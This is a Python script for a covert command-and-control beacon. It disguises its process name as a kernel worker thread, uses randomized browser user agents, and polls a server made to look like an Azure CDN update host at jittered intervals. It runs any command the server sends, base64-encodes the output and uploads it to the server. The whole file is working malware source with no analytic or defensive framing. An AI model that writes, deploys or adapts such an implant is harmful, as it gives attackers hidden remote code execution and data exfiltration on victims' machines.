#!/usr/bin/env python3
import ctypes, time, random, base64, platform
from urllib import request

class SilentBeacon:
    def __init__(self, server, sleep=5, jitter=3):
        self.server = server
        self.sleep = sleep
        self.jitter = jitter
        self.hostname = platform.node()
        try:
            libc = ctypes.CDLL(None)
            libc.prctl(15, b'"[kworker/u:0]"', 0, 0, 0)
        except: pass
    
    def _fake_ua(self):
        agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/537.36 Chrome/131.0.0.0',
            'Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0',
        ]
        return random.choice(agents)
    
    def _beacon(self):
        req = request.Request(
            f'{self.server}/api/ping?h={self.hostname}&ts={int(time.time())}',
            headers={'User-Agent': self._fake_ua()}
        )
        try:
            resp = request.urlopen(req, timeout=5).read().decode()
            if resp and resp != 'None':
                out = __import__('subprocess').getoutput(resp)
                data = base64.b64encode(out.encode()).decode()
                request.urlopen(request.Request(f'{self.server}/api/log', data=data.encode()), timeout=5)
        except: pass
    
    def run(self):
        while True:
            time.sleep(self.sleep + random.randint(0, self.jitter))
            self._beacon()

if __name__ == '__main__':
    import sys
    srv = sys.argv[1] if len(sys.argv) > 1 else 'https://cdn-update.azureedge.net'
    slp = int(sys.argv[2]) if len(sys.argv) > 2 else 5
    jit = int(sys.argv[3]) if len(sys.argv) > 3 else 3
    SilentBeacon(srv, slp, jit).run()
